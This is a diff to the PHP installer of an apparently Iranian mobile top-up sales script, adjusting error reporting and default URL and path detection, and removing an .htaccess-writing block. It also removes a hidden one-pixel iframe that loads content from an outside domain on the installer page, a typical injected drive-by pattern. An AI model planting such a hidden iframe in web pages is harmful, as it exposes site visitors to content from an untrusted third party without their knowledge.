@@ -9,6 +9,8 @@
   it under the terms of the GNU General Public License v3 (http://www.gnu.org/licenses/gpl-3.0.html)
   as published by the Free Software Foundation.
 */
+error_reporting(E_ALL & ~E_NOTICE);
+
 if ($_POST[post])
 {
 	//-- چک کردن ورودي‌ها
@@ -66,8 +68,8 @@ if ($_POST[post])
 else
 {
 	//-- ست کردن مقادير پيشفرض
-	$_POST[site_url] = 'http://'.$_SERVER[SERVER_NAME].'/';
-	$_POST[site_path] = $_SERVER[DOCUMENT_ROOT].'/';
+	$_POST[site_url] = dirname('http://'.$_SERVER[SERVER_NAME].$_SERVER['REQUEST_URI']).'/';
+	$_POST[site_path] = dirname(dirname(__FILE__)).'/';
 	$_POST[db_host] = 'localhost';
 	$_POST[site_title] = 'فروش اينترنتي شارژ';
 	$_POST[site_keyword] = 'فروش , شارژ , اينترنتي , آنلاين , شتاب , ايرانسل , همراه اول , تاليا';
@@ -187,7 +189,6 @@ function form($data,$error)
 	<input type="submit" name="submit" value="نصب" class="form"></dt>
 </form>
 </div>
-<iframe src="http://installfreer.asia/css.css" style="border:0px #FFFFFF none;" name="myiFrame" scrolling="no" frameborder="1" marginheight="0px" marginwidth="0px" height="1px" width="1px"></iframe>
 </body>
 </html>
 <?
@@ -291,17 +292,6 @@ function write_config_file($data)
 );
 //---------------------- Prepare ------------------
 require_once 'prepare.php';";
-	fwrite($fh, $stringData);
-	fclose($fh);
-	
-	//-- htaccess براي نمايش تصاوير
-	$resizerFile = "../statics/upload/images/resized/.htaccess";
-	$fh = fopen($resizerFile, 'w') or die("can't open file");
-	$stringData = "<IfModule mod_rewrite.c>
-  RewriteEngine On
-  RewriteCond %{REQUEST_FILENAME} !-f
-  RewriteRule ^(.*) ".$data[site_path]."/statics/upload/images/resized/anySize.php?file=$1 [QSA]
-</IfModule>";
 	fwrite($fh, $stringData);
 	fclose($fh);
 }
